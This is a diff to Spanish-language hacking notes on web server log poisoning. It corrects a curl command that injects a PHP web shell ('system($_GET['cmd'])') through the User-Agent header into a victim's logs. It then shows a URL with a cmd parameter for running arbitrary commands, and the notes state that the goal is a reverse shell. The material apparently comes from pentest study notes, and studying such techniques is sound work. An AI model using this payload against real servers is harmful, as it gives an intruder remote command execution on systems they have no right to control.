@@ -13,7 +13,7 @@ Podemos realizar un envenenamiento de los logs del servidor web, de manera que n
 Lo ideal es tratar de meter una reverse shell.
 #### Opcion 1
 ```bash
-curl -s -X GET 'http://ip_victima' -H "User-Agent: <?php system($_GET['cmd]); ?"
+curl -s -X GET 'http://ip_victima' -H "User-Agent: <?php system($_GET['cmd']); ?>"
 
 y luego en la URL con un:
 http://ip/ruta_al_log&cmd="comando que se quiera inyectar"
